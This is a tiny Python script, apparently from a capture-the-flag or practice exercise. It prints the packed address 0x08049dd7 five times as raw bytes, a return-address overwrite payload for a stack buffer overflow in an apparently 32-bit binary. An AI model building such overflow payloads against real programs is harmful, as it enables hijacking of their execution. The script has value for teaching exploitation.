from struct import pack
import sys

packing = pack("<I", 0x08049dd7)
sys.stdout.buffer.write(pack("<I", 0x08049dd7))
sys.stdout.buffer.write(pack("<I", 0x08049dd7))
sys.stdout.buffer.write(pack("<I", 0x08049dd7))
sys.stdout.buffer.write(pack("<I", 0x08049dd7))
sys.stdout.buffer.write(pack("<I", 0x08049dd7))
